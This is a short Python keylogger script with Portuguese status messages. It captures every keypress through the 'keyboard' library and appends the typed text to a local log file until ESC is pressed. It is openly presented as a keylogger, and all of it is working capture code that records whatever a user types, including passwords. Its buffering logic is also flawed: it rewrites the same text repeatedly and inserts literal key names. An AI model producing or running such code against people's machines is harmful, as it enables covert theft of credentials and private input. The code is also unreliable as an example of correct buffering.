import keyboard
import time


OUTPUT_FILE = "keyslogger.log"  
MAX_LINE_LENGTH = 100  
MAX_DELAY = 12  

def write_to_file(buffer):
    with open(OUTPUT_FILE, "a", encoding="utf-8") as file:
        file.write(buffer + "\n")

def keylogger_exec():
    buffer = ""  
    last_time = time.time()  

    print("Monitorando teclas. Pressione ESC para sair...")

    while True:
        event = keyboard.read_event() 
        
        if event.event_type == keyboard.KEY_DOWN:  
            current_time = time.time()
            char = event.name

          
            if char == "esc":
                print("Encerrando o monitoramento.")
                break

           
            if len(char) == 1:  
                buffer += char
            elif char == "space":
                buffer += " "
            elif char == "enter":
                buffer += "\n"
            elif char == "backspace" and buffer:  
                buffer = buffer[:-1]

         
            if current_time - last_time > MAX_DELAY or len(buffer) >= MAX_LINE_LENGTH:
                write_to_file(buffer)
                if len(buffer) >= MAX_LINE_LENGTH:
                    buffer = buffer[len(buffer) - MAX_LINE_LENGTH:]
                else:
                    buffer = char  

            last_time = current_time


    if buffer:
        write_to_file(buffer)

if __name__ == "__main__":
    keylogger_exec()
